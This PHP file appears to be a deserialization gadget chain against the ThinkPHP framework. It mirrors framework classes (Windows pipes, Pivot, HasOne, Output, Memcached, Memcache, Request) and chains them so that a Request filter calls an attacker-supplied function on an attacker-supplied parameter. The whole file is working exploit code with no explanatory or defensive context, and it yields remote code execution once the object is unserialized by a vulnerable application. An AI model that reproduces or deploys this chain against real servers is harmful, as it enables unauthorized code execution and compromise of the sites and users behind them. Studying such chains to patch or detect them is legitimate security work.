<?php

namespace think\process\pipes
{
    use think\model\Pivot;

    class Pipes
    {
    }

    class Windows extends Pipes
    {
        private $files = [];

        function __construct($function, $parameter)
        {
            $this->files = [new Pivot($function, $parameter)];
        }
    }
}

namespace think\model
{
    use think\db\Query;

    abstract class Relation
    {
    }
}

namespace think\model\relation
{
    use think\model\Relation;
    use think\db\Query;

    abstract class OneToOne extends Relation
    {
    }

    class HasOne extends OneToOne
    {
        protected $selfRelation;
        protected $query;
        protected $bindAttr = [];

        function __construct($function, $parameter)
        {
            $this->bindAttr = ["no", "123"];
            $this->selfRelation = false;
            $this->query = new Query($function, $parameter);
        }
    }
}


namespace think
{
    use think\model\relation\HasOne;
    use think\console\Output;
    use think\db\Query;

    abstract class Model
    {
        protected $append = [];
        protected $error;
        protected $parent;
        protected $selfRelation;
        protected $query;

        function __construct($function, $parameter)
        {
            $this->append = ['getError'];
            $this->error = new HasOne($function, $parameter);
            $this->parent = new Output($function, $parameter);
            $this->selfRelation = false;
            $this->query = new Query($function, $parameter);
        }
    }
}


namespace think\db
{
    use think\console\Output;

    class Query
    {
        protected $model;
        function __construct($function, $parameter)
        {
            $this->model = new Output($function, $parameter);
        }
    }
}


namespace think\console
{
    use think\session\driver\Memcached;

    class Output
    {
        private $handle = null;
        protected $styles = [];

        function __construct($function, $parameter)
        {
            $this->handle = new Memcached($function, $parameter);
            $this->styles = ['getAttr'];
        }
    }
}


namespace think\session\driver
{
    use think\cache\driver\Memcache;

    class Memcached
    {
        protected $handler = null;
        protected $config  = [];

        function __construct($function, $parameter)
        {
            $this->handler = new Memcache($function, $parameter);
            $this->config = [
                'host'         => '127.0.0.1',
                'port'         => 11211,
                'expire'       => 3600,
                'timeout'      => 0,
                'session_name' => 'HEXENS',
                'username'     => '',
                'password'     => '',
            ];
        }
    }
}



namespace think\cache\driver
{
    use think\Request;

    class Memcache
    {
        protected $options = [];
        protected $handler = null;
        protected $tag;

        function __construct($function, $parameter)
        {
            $this->handler = new Request($function, $parameter);
            $this->options = [
                'expire'        => 0,
                'cache_subdir'  => false,
                'prefix'        => '',
                'path'          => '',
                'data_compress' => false,
            ];
            $this->tag = true;
        }
    }
}



namespace think
{
    class Request
    {
        protected $get;
        protected $filter;

        function __construct($function, $parameter)
        {
            $this->get = ["HEXENS<getAttr>no<" => $parameter];
            $this->filter = $function;
        }
    }
}


namespace think\model
{
    use think\Model;

    class Pivot extends Model
    {
    }
}
